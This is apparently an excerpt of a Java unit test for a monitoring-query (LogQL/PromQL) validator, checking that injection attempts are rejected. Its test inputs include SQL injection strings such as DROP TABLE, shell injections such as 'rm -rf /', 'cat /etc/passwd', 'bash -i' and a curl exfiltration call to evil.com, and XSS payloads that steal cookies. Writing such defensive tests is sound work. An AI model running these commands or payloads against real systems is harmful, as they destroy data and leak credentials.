 ...
 * 
 * Tests guardrails: - Valid LogQL/PromQL patterns - Injection attack prevention
 * - Query complexity limits - Malicious patterns detection
 */
class MonitoringDSLValidatorTest {
  ...
  @ParameterizedTest @ValueSource(strings = { "{app=\"test\"} | DROP TABLE users --",
      "{app=\"test\"} | DELETE FROM logs WHERE 1=1", "{app=\"test\"} | UPDATE metrics SET value=0",
      "{app=\"test\"} | INSERT INTO logs VALUES (1, 'hacked')", "'; DROP TABLE users; --" })
  ...
  @ParameterizedTest @ValueSource(strings = { "{app=\"test\"} | rm -rf /",
      "{app=\"test\"} | cat /etc/passwd", "{app=\"test\"} | curl http://evil.com/exfiltrate",
      "{app=\"test\"} && bash -i", "$(whoami)" })
  ...
  void shouldRejectEmptyQuery() {
    ...
    assertThat(errors).isNotEmpty().anyMatch(error -> error.contains("empty"));
  }
  ...
  @ParameterizedTest @ValueSource(strings = { "<script>alert('xss')</script>",
      "{app=\"test\"} | <img src=x onerror=alert(1)>", "javascript:alert(document.cookie)",
      "{app=\"test\"} | <iframe src=\"evil.com\"></iframe>" })
  void shouldRejectXSSAttempts(String maliciousQuery) {
    List<String> errors = validator.validate(maliciousQuery);

    assertThat(errors).isNotEmpty().anyMatch(
        error -> error.contains("XSS") || error.contains("script") || error.contains("HTML"));
  }
  ...
  void shouldRejectInvalidBraceBalance() {
    ...
    assertThat(errors).isNotEmpty().anyMatch(
        error -> error.contains("brace") || error.contains("bracket") || error.contains("syntax"));
  }
}
